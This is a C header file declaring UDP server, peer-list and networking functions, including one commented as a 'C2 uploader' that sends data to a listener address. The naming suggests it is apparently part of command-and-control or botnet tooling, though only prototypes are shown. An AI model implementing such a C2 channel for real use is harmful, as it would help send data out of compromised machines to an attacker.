#ifndef NETWORK_UTILS_H
#define NETWORK_UTILS_H

#include <sys/socket.h>
#include <netinet/in.h>

#include "../include/system_utils.h"
#include "../include/types.h"

typedef struct _peer_list peer_list;

/**
 * Stop the server
 * 
 * Changes the value of the semaphore to stop the server
 * 
 * Returns - OK or ERROR
 */
int stop_server(char *ip, in_port_t port);

/**
 * UDP Server
 *
 * Waits for instructions from the server
 *
 * port - Integer with the port we want to use
 *
 * Returns - The data or NULL in case of error
*/
int start_server(in_port_t port);

int init_networking();
int clean_networking();
int get_ip(const struct sockaddr_in *socket, char *ip);
int handle_comm(peer_list *peers, const struct sockaddr_in *other, const byte *data);
int add_peer(peer_list *peers, const struct sockaddr_in *other, const byte *data);
int get_peer(const peer_list *peers, const char *other_ip, size_t *index);

/**
 * C2 uploader
 *
 * It uploads generic data to the specified ip
 *
 * ip_addr - String with ip address of the listener
 * data - Data to send to the server
 *
 * Returns - The number of bytes sent or -1 in case of error with errno set appropriately
*/
size_t upload_data(char *ip_addr, in_port_t port, unsigned char *data, size_t len);

#endif